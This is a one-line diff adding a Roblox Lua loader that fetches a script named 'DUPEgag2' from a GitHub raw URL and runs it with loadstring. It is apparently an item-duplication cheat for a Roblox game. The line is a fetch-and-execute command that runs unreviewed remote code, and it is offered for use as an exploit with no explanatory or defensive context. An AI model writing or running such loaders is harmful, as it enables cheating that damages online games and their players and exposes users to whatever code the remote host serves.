@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zuritoprogaymer-devl/Scripts.gag2/refs/heads/main/DUPEgag2"))()
